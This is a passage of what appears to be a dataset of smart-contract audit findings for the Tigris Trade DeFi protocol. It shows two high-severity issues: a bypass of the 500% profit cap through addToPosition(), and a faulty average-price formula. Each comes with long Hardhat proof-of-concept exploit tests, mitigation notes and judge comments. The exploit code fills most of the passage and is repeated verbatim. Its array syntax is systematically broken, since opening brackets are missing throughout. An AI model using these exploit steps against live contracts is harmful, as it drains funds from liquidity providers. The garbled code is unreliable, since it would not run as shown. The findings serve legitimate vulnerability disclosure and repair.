deployments.get(\"TradingExtension\");\n    tradingExtension = await ethers.getContractAt(\"TradingExtension\", TradingExtension.address);\n    const Position = await deployments.get(\"Position\");\n    position = await ethers.getContractAt(\"Position\", Position.address);\n    MockDAI = await deployments.get(\"MockDAI\");\n    mockdai = await ethers.getContractAt(\"MockERC20\", MockDAI.address);\n    MockUSDC = await deployments.get(\"MockUSDC\");\n    mockusdc = await ethers.getContractAt(\"MockERC20\", MockUSDC.address);\n    const PairsContract = await deployments.get(\"PairsContract\");\n    pairscontract = await ethers.getContractAt(\"PairsContract\", PairsContract.address);\n    const Referrals = await deployments.get(\"Referrals\");\n    referrals = await ethers.getContractAt(\"Referrals\", Referrals.address);\n    StableVault = await deployments.get(\"StableVault\");\n    stablevault = await ethers.getContractAt(\"StableVault\", StableVault.address);\n    await stablevault.connect(owner).listToken(MockDAI.address);\n    await stablevault.connect(owner).listToken(MockUSDC.address);\n    await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);\n    await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther(\"1\"));\n    await tradingExtension.connect(owner).setNode(node.address, true);\n    await tradingExtension.connect(owner).setNode(node2.address, true);\n    await tradingExtension.connect(owner).setNode(node3.address, true);\n    await network.provider.send(\"evm_setNextBlockTimestamp\", 2000000000]);\n    await network.provider.send(\"evm_mine\");\n    permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);\n    permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);\n\n    const BadStableVault = await ethers.getContractFactory(\"BadStableVault\");\n    badstablevault = await BadStableVault.deploy(StableToken.address);\n\n    const ChainlinkContract = await ethers.getContractFactory(\"MockChainlinkFeed\");\n    chainlink = await ChainlinkContract.deploy();\n\n    TradingLibrary = await deployments.get(\"TradingLibrary\");\n    tradinglibrary = await ethers.getContractAt(\"TradingLibrary\", TradingLibrary.address);\n    await trading.connect(owner).setLimitOrderPriceRange(1e10);\n  });\n\n\n  describe(\"Bypass the maximum PnL check to take extra profit\", function () {\n    let orderId;\n    let closePriceData;\n    let closeSig;\n    let initPrice = parseEther(\"1000\");\n    let closePrice = parseEther(\"2000\");\n    beforeEach(async function () {\n      let maxWin = await trading.maxWinPercent();\n      expect(maxWin.eq(5e10)).to.equal(true);\n\n      let TradeInfo = parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 1, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n      let PriceData = node.address, 1, initPrice, 0, 2000000000, false];\n      let message = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          'address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          node.address, 1, initPrice, 0, 2000000000, false]\n        )\n      );\n      let sig = await node.signMessage(\n        Buffer.from(message.substring(2), 'hex')\n      );\n      \n      let PermitData = permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n      orderId = await position.getCount();\n      await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);\n      expect(await position.assetOpenPositionsLength(1)).to.equal(1);\n      let trade = await position.trades(orderId);\n      let marginAfterFee = trade.margin;\n      expect(marginAfterFee.eq(parseEther('990'))).to.equal(true);\n\n      // Some time later\n      await network.provider.send(\"evm_setNextBlockTimestamp\", 2000001000]);\n      await network.provider.send(\"evm_mine\");\n      \n      // Now the price is doubled, profit = margin * leverage = $990 * 10 = $9900\n      closePriceData = node.address, 1, closePrice, 0, 2000001000, false];\n      let closeMessage = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          'address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          node.address, 1, closePrice, 0, 2000001000, false]\n        )\n      );\n      closeSig = await node.signMessage(\n        Buffer.from(closeMessage.substring(2), 'hex')\n      );\n\n    });\n\n    it.only(\"All profit is $9900, close the order normally, only get $3960 profit\", async function () {\n      let balanceBefore = await stabletoken.balanceOf(owner.address);\n      await trading.connect(owner).initiateCloseOrder(orderId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);\n      let balanceAfter = await stabletoken.balanceOf(owner.address);\n      let marginAfterFee = parseEther(\"990\");\n      let payout = balanceAfter.sub(balanceBefore);\n      expect(payout.eq(parseEther(\"4950\"))).to.be.true;\n\n      let profit = balanceAfter.sub(balanceBefore).sub(marginAfterFee);\n      expect(profit.eq(parseEther(\"3960\"))).to.be.true;\n\n    });\n\n    it.only(\"All profit is $9900, bypass the PnL check to take extra $2600 profit\", async function () {\n      // We increase the possition first rather than closing the profit order directly\n      let PermitData = permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];\n      let extraMargin = parseEther(\"1000\");\n      await trading.connect(owner).addToPosition(orderId, extraMargin, closePriceData, closeSig, StableVault.address, MockDAI.address, PermitData, owner.address);\n\n      // 60 secs later\n      await network.provider.send(\"evm_setNextBlockTimestamp\", 2000001060]);\n      await network.provider.send(\"evm_mine\");\n  \n      // Now we close the order to take all profit\n      closePriceData = node.address, 1, closePrice, 0, 2000001060, false];\n      let closeMessage = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          'address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          node.address, 1, closePrice, 0, 2000001060, false]\n        )\n      );\n      closeSig = await node.signMessage(\n        Buffer.from(closeMessage.substring(2), 'hex')\n      );\n\n      let balanceBefore = await stabletoken.balanceOf(owner.address);\n      await trading.connect(owner).initiateCloseOrder(orderId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);\n      let balanceAfter = await stabletoken.balanceOf(owner.address);\n      let marginAfterFee = parseEther(\"990\").add(extraMargin.mul(990).div(1000));\n      let originalProfit = parseEther(\"3960\");\n      let extraProfit = balanceAfter.sub(balanceBefore).sub(marginAfterFee).sub(originalProfit);\n      expect(extraProfit.gt(parseEther('2600'))).to.be.true;\n    });\n\n  });\n});\n\n\n"
                ],
                "Type": " Bypass the maximum PnL check to take extra profit",
                "Description": "*Submitted by KingNFT(https://github.com/code-423n4/2022-12-tigris-findings/issues/111)*\n\nTo protect the fund of vault, the protocol has a security mechanism which limits:\n\n    Maximum PnL is +500%. \n\nsource: <https://docs.tigris.trade/protocol/trading-and-fees#limitations\n\nBut the implementation is missing to check this limitation while addToPosition(), an attacker can exploit it to get more profit than expected.\n\n\nThe following test case shows both normal case and the exploit scenario.\n\nIn the normal case,  a 990 USD margin, gets back a 500% of 4950 USD payout, and the profit is 3960 USD.\n\nIn the exploit case, the attack will get an extra 2600+ USD profit than the normal case.\n\n\nconst { expect } = require(\"chai\");\nconst { deployments, ethers, waffle } = require(\"hardhat\");\nconst { parseEther, formatEther } = ethers.utils;\nconst { signERC2612Permit } = require('eth-permit');\nconst exp = require(\"constants\");\n\ndescribe(\"Design Specification: Maximum PnL is +500%\", function () {\n\n  let owner;\n  let node;\n  let user;\n  let node2;\n  let node3;\n  let proxy;\n\n  let Trading;\n  let trading;\n\n  let TradingExtension;\n  let tradingExtension;\n\n  let TradingLibrary;\n  let tradinglibrary;\n\n  let StableToken;\n  let stabletoken;\n\n  let StableVault;\n  let stablevault;\n\n  let position;\n\n  let pairscontract;\n  let referrals;\n\n  let permitSig;\n  let permitSigUsdc;\n\n  let MockDAI;\n  let mockdai;\n  let MockUSDC;\n  let mockusdc;\n\n  let badstablevault;\n\n  let chainlink;\n\n  beforeEach(async function () {\n    await deployments.fixture(['test']);\n    owner, node, user, node2, node3, proxy] = await ethers.getSigners();\n    StableToken = await deployments.get(\"StableToken\");\n    stabletoken = await ethers.getContractAt(\"StableToken\", StableToken.address);\n    Trading = await deployments.get(\"Trading\");\n    trading = await ethers.getContractAt(\"Trading\", Trading.address);\n    await trading.connect(owner).setMaxWinPercent(5e10);\n    TradingExtension = await deployments.get(\"TradingExtension\");\n    tradingExtension = await ethers.getContractAt(\"TradingExtension\", TradingExtension.address);\n    const Position = await deployments.get(\"Position\");\n    position = await ethers.getContractAt(\"Position\", Position.address);\n    MockDAI = await deployments.get(\"MockDAI\");\n    mockdai = await ethers.getContractAt(\"MockERC20\", MockDAI.address);\n    MockUSDC = await deployments.get(\"MockUSDC\");\n    mockusdc = await ethers.getContractAt(\"MockERC20\", MockUSDC.address);\n    const PairsContract = await deployments.get(\"PairsContract\");\n    pairscontract = await ethers.getContractAt(\"PairsContract\", PairsContract.address);\n    const Referrals = await deployments.get(\"Referrals\");\n    referrals = await ethers.getContractAt(\"Referrals\", Referrals.address);\n    StableVault = await deployments.get(\"StableVault\");\n    stablevault = await ethers.getContractAt(\"StableVault\", StableVault.address);\n    await stablevault.connect(owner).listToken(MockDAI.address);\n    await stablevault.connect(owner).listToken(MockUSDC.address);\n    await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);\n    await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther(\"1\"));\n    await tradingExtension.connect(owner).setNode(node.address, true);\n    await tradingExtension.connect(owner).setNode(node2.address, true);\n    await tradingExtension.connect(owner).setNode(node3.address, true);\n    await network.provider.send(\"evm_setNextBlockTimestamp\", 2000000000]);\n    await network.provider.send(\"evm_mine\");\n    permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);\n    permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);\n\n    const BadStableVault = await ethers.getContractFactory(\"BadStableVault\");\n    badstablevault = await BadStableVault.deploy(StableToken.address);\n\n    const ChainlinkContract = await ethers.getContractFactory(\"MockChainlinkFeed\");\n    chainlink = await ChainlinkContract.deploy();\n\n    TradingLibrary = await deployments.get(\"TradingLibrary\");\n    tradinglibrary = await ethers.getContractAt(\"TradingLibrary\", TradingLibrary.address);\n    await trading.connect(owner).setLimitOrderPriceRange(1e10);\n  });\n\n\n  describe(\"Bypass the maximum PnL check to take extra profit\", function () {\n    let orderId;\n    let closePriceData;\n    let closeSig;\n    let initPrice = parseEther(\"1000\");\n    let closePrice = parseEther(\"2000\");\n    beforeEach(async function () {\n      let maxWin = await trading.maxWinPercent();\n      expect(maxWin.eq(5e10)).to.equal(true);\n\n      let TradeInfo = parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 1, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n      let PriceData = node.address, 1, initPrice, 0, 2000000000, false];\n      let message = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          'address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          node.address, 1, initPrice, 0, 2000000000, false]\n        )\n      );\n      let sig = await node.signMessage(\n        Buffer.from(message.substring(2), 'hex')\n      );\n      \n      let PermitData = permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n      orderId = await position.getCount();\n      await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);\n      expect(await position.assetOpenPositionsLength(1)).to.equal(1);\n      let trade = await position.trades(orderId);\n      let marginAfterFee = trade.margin;\n      expect(marginAfterFee.eq(parseEther('990'))).to.equal(true);\n\n      // Some time later\n      await network.provider.send(\"evm_setNextBlockTimestamp\", 2000001000]);\n      await network.provider.send(\"evm_mine\");\n      \n      // Now the price is doubled, profit = margin * leverage = $990 * 10 = $9900\n      closePriceData = node.address, 1, closePrice, 0, 2000001000, false];\n      let closeMessage = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          'address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          node.address, 1, closePrice, 0, 2000001000, false]\n        )\n      );\n      closeSig = await node.signMessage(\n        Buffer.from(closeMessage.substring(2), 'hex')\n      );\n\n    });\n\n    it.only(\"All profit is $9900, close the order normally, only get $3960 profit\", async function () {\n      let balanceBefore = await stabletoken.balanceOf(owner.address);\n      await trading.connect(owner).initiateCloseOrder(orderId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);\n      let balanceAfter = await stabletoken.balanceOf(owner.address);\n      let marginAfterFee = parseEther(\"990\");\n      let payout = balanceAfter.sub(balanceBefore);\n      expect(payout.eq(parseEther(\"4950\"))).to.be.true;\n\n      let profit = balanceAfter.sub(balanceBefore).sub(marginAfterFee);\n      expect(profit.eq(parseEther(\"3960\"))).to.be.true;\n\n    });\n\n    it.only(\"All profit is $9900, bypass the PnL check to take extra $2600 profit\", async function () {\n      // We increase the possition first rather than closing the profit order directly\n      let PermitData = permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];\n      let extraMargin = parseEther(\"1000\");\n      await trading.connect(owner).addToPosition(orderId, extraMargin, closePriceData, closeSig, StableVault.address, MockDAI.address, PermitData, owner.address);\n\n      // 60 secs later\n      await network.provider.send(\"evm_setNextBlockTimestamp\", 2000001060]);\n      await network.provider.send(\"evm_mine\");\n  \n      // Now we close the order to take all profit\n      closePriceData = node.address, 1, closePrice, 0, 2000001060, false];\n      let closeMessage = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          'address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          node.address, 1, closePrice, 0, 2000001060, false]\n        )\n      );\n      closeSig = await node.signMessage(\n        Buffer.from(closeMessage.substring(2), 'hex')\n      );\n\n      let balanceBefore = await stabletoken.balanceOf(owner.address);\n      await trading.connect(owner).initiateCloseOrder(orderId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);\n      let balanceAfter = await stabletoken.balanceOf(owner.address);\n      let marginAfterFee = parseEther(\"990\").add(extraMargin.mul(990).div(1000));\n      let originalProfit = parseEther(\"3960\");\n      let extraProfit = balanceAfter.sub(balanceBefore).sub(marginAfterFee).sub(originalProfit);\n      expect(extraProfit.gt(parseEther('2600'))).to.be.true;\n    });\n\n  });\n});\n\n\n\n\nThe test result\n\n     Design Specification: Maximum PnL is +500%\n        Bypass the maximum PnL check to take extra profit\n          \u221a All profit is $9900, close the order normally, only get $3960 profit\n          \u221a All profit is $9900, bypass the PnL check to take extra $2600 profit\n\n\nVS Code\n\n",
                "Repair": "\nAdd a check for addToPosition() function, revert if PnL = 500%, enforce users to close the order to take a limited profit.\n\nTriHaz (Tigris Trade) confirmed, but disagreed with severity and commented(https://github.com/code-423n4/2022-12-tigris-findings/issues/111#issuecomment-1364943872):\n  It is valid but I think it should be Medium risk as it needs +500% win to happen so assets are not in a direct risk, need a judge opinion on this.\n\nKingNFT (warden) commented(https://github.com/code-423n4/2022-12-tigris-findings/issues/111#issuecomment-1378270756):\n  As the max leverages are 100x for crypto pairs and 500x for forex pairs, so 5% price change on crypto pairs or 1% on forex pairs lead to 500% profit. I think it would be frequent to see +500% win happening.\n \n In my personal opinion, the 500% security design is a base and important feature to protect fund safety of stakers, this bug causes the feature almost not working. Maybe it deserves a high severity.\n\nAlex the Entreprenerd (judge) commented(https://github.com/code-423n4/2022-12-tigris-findings/issues/111#issuecomment-1383720303):\n  The Warden has shown how, because of a lack of checks, an attacker could bypass the PNL cap and extract more value than intended.\n \n While the condition of having a price movement of 500% can be viewed as external, I believe that in this specific case we have to exercise more nuance.\n \n An attacker could setup a contract to perform the sidestep only when favourable, meaning that while the condition may not always be met, due to volatility of pricing there always is a % (can be viewed as a poisson distribution) that a PNL bypass would favour the attacker.\n \n Additionally, after the CRV / AVI attack(https://chaindebrief.com/how-manipulation-on-aave-and-curve-went-wrong-attacker-got-rekted-instead/) we have pretty strong evidence that any +EV scenario can be exploited as long as the payout is high enough.\n \n As such I believe that the finding doesn't truly rely on an external condition.\n \n For this reason, as well as knowing that the value extracted will be paid by LPs / the Protocol, I believe High Severity to be the most appropriate\n\nGainsGoblin (Tigris Trade) commented(https://github.com/code-423n4/2022-12-tigris-findings/issues/111#issuecomment-1407134511):\n  Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419173887 \n \n Implemented something similar to this report's recommended mitigation, where if PnL is = maxPnl%-100%, then addToPosition, addMargin and removeMargin revert.\n\n\n\n*\n\n\n"
            },
            {
                "Name": "H-06",
                "Location": [
                    "\nconst { expect } = require(\"chai\");\nconst { deployments, ethers, waffle } = require(\"hardhat\");\nconst { parseEther, formatEther } = ethers.utils;\nconst { signERC2612Permit } = require('eth-permit');\nconst exp = require(\"constants\");\n\ndescribe(\"Incorrect calculation of new margin price while adding position\", function () {\n  let owner;\n  let node;\n  let user;\n  let node2;\n  let node3;\n  let proxy;\n\n  let Trading;\n  let trading;\n\n  let TradingExtension;\n  let tradingExtension;\n\n  let TradingLibrary;\n  let tradinglibrary;\n\n  let StableToken;\n  let stabletoken;\n\n  let StableVault;\n  let stablevault;\n\n  let position;\n\n  let pairscontract;\n  let referrals;\n\n  let permitSig;\n  let permitSigUsdc;\n\n  let MockDAI;\n  let mockdai;\n  let MockUSDC;\n  let mockusdc;\n\n  let badstablevault;\n\n  let chainlink;\n\n  beforeEach(async function () {\n    await deployments.fixture(['test']);\n    owner, node, user, node2, node3, proxy] = await ethers.getSigners();\n    StableToken = await deployments.get(\"StableToken\");\n    stabletoken = await ethers.getContractAt(\"StableToken\", StableToken.address);\n    Trading = await deployments.get(\"Trading\");\n    trading = await ethers.getContractAt(\"Trading\", Trading.address);\n    await trading.connect(owner).setMaxWinPercent(5e10);\n    TradingExtension = await deployments.get(\"TradingExtension\");\n    tradingExtension = await ethers.getContractAt(\"TradingExtension\", TradingExtension.address);\n    const Position = await deployments.get(\"Position\");\n    position = await ethers.getContractAt(\"Position\", Position.address);\n    MockDAI = await deployments.get(\"MockDAI\");\n    mockdai = await ethers.getContractAt(\"MockERC20\", MockDAI.address);\n    MockUSDC = await deployments.get(\"MockUSDC\");\n    mockusdc = await ethers.getContractAt(\"MockERC20\", MockUSDC.address);\n    const PairsContract = await deployments.get(\"PairsContract\");\n    pairscontract = await ethers.getContractAt(\"PairsContract\", PairsContract.address);\n    const Referrals = await deployments.get(\"Referrals\");\n    referrals = await ethers.getContractAt(\"Referrals\", Referrals.address);\n    StableVault = await deployments.get(\"StableVault\");\n    stablevault = await ethers.getContractAt(\"StableVault\", StableVault.address);\n    await stablevault.connect(owner).listToken(MockDAI.address);\n    await stablevault.connect(owner).listToken(MockUSDC.address);\n    await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);\n    await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther(\"1\"));\n    await tradingExtension.connect(owner).setNode(node.address, true);\n    await tradingExtension.connect(owner).setNode(node2.address, true);\n    await tradingExtension.connect(owner).setNode(node3.address, true);\n    await network.provider.send(\"evm_setNextBlockTimestamp\", 2000000000]);\n    await network.provider.send(\"evm_mine\");\n    permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);\n    permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);\n\n    const BadStableVault = await ethers.getContractFactory(\"BadStableVault\");\n    badstablevault = await BadStableVault.deploy(StableToken.address);\n\n    const ChainlinkContract = await ethers.getContractFactory(\"MockChainlinkFeed\");\n    chainlink = await ChainlinkContract.deploy();\n\n    TradingLibrary = await deployments.get(\"TradingLibrary\");\n    tradinglibrary = await ethers.getContractAt(\"TradingLibrary\", TradingLibrary.address);\n    await trading.connect(owner).setLimitOrderPriceRange(1e10);\n  });\n\n\n  describe(\"Initial margin $500, leverage 2x, position $1000, price $1000\", function () {\n    let orderId;\n    let initPrice = parseEther(\"1000\");\n    beforeEach(async function () {\n      // To simpliy the problem, set fees to 0\n      await trading.setFees(true, 0, 0, 0, 0, 0);\n      await trading.setFees(false, 0, 0, 0, 0, 0);\n\n      let TradeInfo = parseEther(\"500\"), MockDAI.address, StableVault.address, parseEther(\"2\"), 1, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n      let PriceData = node.address, 1, initPrice, 0, 2000000000, false];\n      let message = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          'address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          node.address, 1, initPrice, 0, 2000000000, false]\n        )\n      );\n      let sig = await node.signMessage(\n        Buffer.from(message.substring(2), 'hex')\n      );\n      \n      let PermitData = permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n      orderId = await position.getCount();\n      await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);\n      expect(await position.assetOpenPositionsLength(1)).to.equal(1);\n      let trade = await position.trades(orderId);\n      let marginAfterFee = trade.margin;\n      expect(marginAfterFee.eq(parseEther('500'))).to.equal(true);\n      expect(trade.price.eq(parseEther('1000'))).to.be.true;\n      expect(trade.leverage.eq(parseEther('2'))).to.be.true;\n    });\n\n    it.only(\"Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1666\", async function () {\n      // The price increases from $1000 to $2000, the old position earns $1000 profit.\n      // The expected PnL payout = old margin + earned profit + new margin\n      //                         = $500 + $1000 + $500\n      //                         = $2000\n      let addingPrice = parseEther('2000');\n      let addingPriceData = node.address, 1, addingPrice, 0, 2000000000, false];\n      let addingMessage = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          'address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          node.address, 1, addingPrice, 0, 2000000000, false]\n        )\n      );\n      let addingSig = await node.signMessage(\n        Buffer.from(addingMessage.substring(2), 'hex')\n      );\n\n      let PermitData = permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];\n      await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);\n\n      let trade = await position.trades(orderId);\n      let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,\n        trade.margin, trade.leverage, trade.accInterest);\n      expect(pnl._payout.gt(parseEther('1666'))).to.be.true;\n      expect(pnl._payout.lt(parseEther('1667'))).to.be.true;\n    });\n\n    it.only(\"Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $714\", async function () {\n      // The price decreases from $1000 to $750, the old position losses $250.\n      // The expected PnL payout = old margin loss + new margin\n      //                         = $500 $250 + $500\n      //                         = $750\n      let addingPrice = parseEther('750');\n      let addingPriceData = node.address, 1, addingPrice, 0, 2000000000, false];\n      let addingMessage = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          'address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          node.address, 1, addingPrice, 0, 2000000000, false]\n        )\n      );\n      let addingSig = await node.signMessage(\n        Buffer.from(addingMessage.substring(2), 'hex')\n      );\n\n      let PermitData = permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];\n      await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);\n\n      let trade = await position.trades(orderId);\n      let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,\n        trade.margin, trade.leverage, trade.accInterest);\n      expect(pnl._payout.gt(parseEther('714'))).to.be.true;\n      expect(pnl._payout.lt(parseEther('715'))).to.be.true;\n    });\n\n  });\n});\n\n"
                ],
                "Type": " Incorrect calculation of new price while adding position",
                "Description": "*Submitted by KingNFT(https://github.com/code-423n4/2022-12-tigris-findings/issues/236)*\n\nThe formula used for calculating _newPrice in addToPosition() function of Trading.sol is not correct, users will lose part of their funds/profit while using this function.\n\nThe wrong formula\n\n    uint _newPrice = _trade.price*_trade.margin/_newMargin + _price*_addMargin/_newMargin;\n\nThe correct formula is\n\n    uint _newPrice = _trade.price * _price * _newMargin /  (_trade.margin * _price + _addMargin * _trade.price);\n\nWhy this works?\n\nGiven\n\n    P1 = _trade.price\n    P2 = _price\n    P = _newPrice\n    M1 = _trade.margin\n    M2 = _addMargin\n    M =  M1 + M2 = _newMargin\n    L = _trade.leverage\n    U1 = M1 * L  = old position in USD\n    U2 = M2 * L = new position in USD\n    U = U1 + U2 = total position in USD\n    E1 = U1 / P1 = old position of base asset, such as ETH, of the pair\n    E2 = U2 / P2 = new position of base asset of the pair\n    E = E1 + E2 = total position of base asset of the pair\n\nThen\n\n    P = U / E\n      = (U1 + U2) / (E1 + E2)\n      = (M1 * L + M2 * L) / (U1 / P1 + U2 / P2)\n      = P1 * P2 * (M1 * L + M2 * L) / (U1 * P2 + U2 * P1)\n      = P1 * P2 * (M1 + M2) * L / (M1 * L * P2 + M2 * L * P1)\n      = P1 * P2 * (M1 + M2) * L / (M1 * P2 + M2 * P1) * L]\n      = P1 * P2 * M / (M1 * P2 + M2 * P1)\n\nproven.\n\n\nThe following test case shows two examples that users lose some funds due to adding a new position whenever their existing position is in profit or loss state.\n\n\nconst { expect } = require(\"chai\");\nconst { deployments, ethers, waffle } = require(\"hardhat\");\nconst { parseEther, formatEther } = ethers.utils;\nconst { signERC2612Permit } = require('eth-permit');\nconst exp = require(\"constants\");\n\ndescribe(\"Incorrect calculation of new margin price while adding position\", function () {\n  let owner;\n  let node;\n  let user;\n  let node2;\n  let node3;\n  let proxy;\n\n  let Trading;\n  let trading;\n\n  let TradingExtension;\n  let tradingExtension;\n\n  let TradingLibrary;\n  let tradinglibrary;\n\n  let StableToken;\n  let stabletoken;\n\n  let StableVault;\n  let stablevault;\n\n  let position;\n\n  let pairscontract;\n  let referrals;\n\n  let permitSig;\n  let permitSigUsdc;\n\n  let MockDAI;\n  let mockdai;\n  let MockUSDC;\n  let mockusdc;\n\n  let badstablevault;\n\n  let chainlink;\n\n  beforeEach(async function () {\n    await deployments.fixture(['test']);\n    owner, node, user, node2, node3, proxy] = await ethers.getSigners();\n    StableToken = await deployments.get(\"StableToken\");\n    stabletoken = await ethers.getContractAt(\"StableToken\", StableToken.address);\n    Trading = await deployments.get(\"Trading\");\n    trading = await ethers.getContractAt(\"Trading\", Trading.address);\n    await trading.connect(owner).setMaxWinPercent(5e10);\n    TradingExtension = await deployments.get(\"TradingExtension\");\n    tradingExtension = await ethers.getContractAt(\"TradingExtension\", TradingExtension.address);\n    const Position = await deployments.get(\"Position\");\n    position = await ethers.getContractAt(\"Position\", Position.address);\n    MockDAI = await deployments.get(\"MockDAI\");\n    mockdai = await ethers.getContractAt(\"MockERC20\", MockDAI.address);\n    MockUSDC = await deployments.get(\"MockUSDC\");\n    mockusdc = await ethers.getContractAt(\"MockERC20\", MockUSDC.address);\n    const PairsContract = await deployments.get(\"PairsContract\");\n    pairscontract = await ethers.getContractAt(\"PairsContract\", PairsContract.address);\n    const Referrals = await deployments.get(\"Referrals\");\n    referrals = await ethers.getContractAt(\"Referrals\", Referrals.address);\n    StableVault = await deployments.get(\"StableVault\");\n    stablevault = await ethers.getContractAt(\"StableVault\", StableVault.address);\n    await stablevault.connect(owner).listToken(MockDAI.address);\n    await stablevault.connect(owner).listToken(MockUSDC.address);\n    await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);\n    await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther(\"1\"));\n    await tradingExtension.connect(owner).setNode(node.address, true);\n    await tradingExtension.connect(owner).setNode(node2.address, true);\n    await tradingExtension.connect(owner).setNode(node3.address, true);\n    await network.provider.send(\"evm_setNextBlockTimestamp\", 2000000000]);\n    await network.provider.send(\"evm_mine\");\n    permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);\n    permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);\n\n    const BadStableVault = await ethers.getContractFactory(\"BadStableVault\");\n    badstablevault = await BadStableVault.deploy(StableToken.address);\n\n    const ChainlinkContract = await ethers.getContractFactory(\"MockChainlinkFeed\");\n    chainlink = await ChainlinkContract.deploy();\n\n    TradingLibrary = await deployments.get(\"TradingLibrary\");\n    tradinglibrary = await ethers.getContractAt(\"TradingLibrary\", TradingLibrary.address);\n    await trading.connect(owner).setLimitOrderPriceRange(1e10);\n  });\n\n\n  describe(\"Initial margin $500, leverage 2x, position $1000, price $1000\", function () {\n    let orderId;\n    let initPrice = parseEther(\"1000\");\n    beforeEach(async function () {\n      // To simpliy the problem, set fees to 0\n      await trading.setFees(true, 0, 0, 0, 0, 0);\n      await trading.setFees(false, 0, 0, 0, 0, 0);\n\n      let TradeInfo = parseEther(\"500\"), MockDAI.address, StableVault.address, parseEther(\"2\"), 1, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n      let PriceData = node.address, 1, initPrice, 0, 2000000000, false];\n      let message = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          'address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          node.address, 1, initPrice, 0, 2000000000, false]\n        )\n      );\n      let sig = await node.signMessage(\n        Buffer.from(message.substring(2), 'hex')\n      );\n      \n      let PermitData = permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n      orderId = await position.getCount();\n      await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);\n      expect(await position.assetOpenPositionsLength(1)).to.equal(1);\n      let trade = await position.trades(orderId);\n      let marginAfterFee = trade.margin;\n      expect(marginAfterFee.eq(parseEther('500'))).to.equal(true);\n      expect(trade.price.eq(parseEther('1000'))).to.be.true;\n      expect(trade.leverage.eq(parseEther('2'))).to.be.true;\n    });\n\n    it.only(\"Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1666\", async function () {\n      // The price increases from $1000 to $2000, the old position 